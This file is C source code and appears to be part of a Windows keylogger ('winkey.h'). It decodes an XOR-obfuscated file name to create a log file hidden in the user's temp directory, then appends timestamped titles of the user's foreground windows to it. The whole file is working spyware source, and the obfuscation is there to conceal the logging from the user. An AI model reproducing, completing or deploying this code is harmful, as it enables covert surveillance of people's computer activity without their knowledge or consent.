#include <winkey.h>

void CreateLogFile(void)
{
    wchar_t tempPath[MAX_PATH];

    GetTempPathW(MAX_PATH, tempPath);
    
    char    *file = "5B63476D485A7C0E464443";

    char    *res = (char *)XorStrings(file);
    size_t  len = strlen(file);
    wchar_t log[12];
    mbstowcs_s(&len, log, len, res, len);
    wcscat_s(tempPath, MAX_PATH, log);

    LOG_FD = CreateFileW(
            tempPath,
            GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (LOG_FD == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile error: %lu\n", GetLastError());
        return;
    }
    
    SetFilePointer(LOG_FD, 0, NULL, FILE_END);
}

char    *GetMyLocalTime(void)
{
    time_t      t = 0;
    struct tm   tm_info;
    char        *buffer = NULL;

    t = time(NULL);
    if (localtime_s(&tm_info, &t) != 0)
        return (NULL);

    // string format: "[DD.MM.YYYY HH:MM:SS]" + \0 = 22
    buffer = malloc(22);
    if (!buffer)
        return (NULL);

    snprintf(buffer, 22, "[%02d.%02d.%04d %02d:%02d:%02d]",
             tm_info.tm_mday,
             tm_info.tm_mon + 1,
             tm_info.tm_year + 1900,
             tm_info.tm_hour,
             tm_info.tm_min,
             tm_info.tm_sec);

    return (buffer);
}

void WriteToFile(char* str)
{
    DWORD bytesWritten;
    WriteFile(LOG_FD, str, strlen(str), &bytesWritten, NULL);
}

void _GetForegroundWindow(HWND hwnd)
{
	wchar_t windowTitleW[256];
	if (!GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)))
		return;

	int i = 0;
	while (windowTitleW[i] != '\0' && i < 256 - 1)
	{
		if (windowTitleW[i] == '\r' || windowTitleW[i] == '\n')
			windowTitleW[i] = ' ';
		i++;
	}
	windowTitleW[i] = '\0';

	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
	char *windowTitleUtf8 = (char*)malloc(utf8Len);
	if (!windowTitleUtf8)
		return;

	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);

	char *dateStr = GetMyLocalTime();
	if (!dateStr)
	{
		free(windowTitleUtf8);
		return;
	}

	char logEntry[1024];
	snprintf(logEntry, sizeof(logEntry), "\n%s - '%s'\n", dateStr, windowTitleUtf8);
	WriteToFile(logEntry);

	free(windowTitleUtf8);
	free(dateStr);
}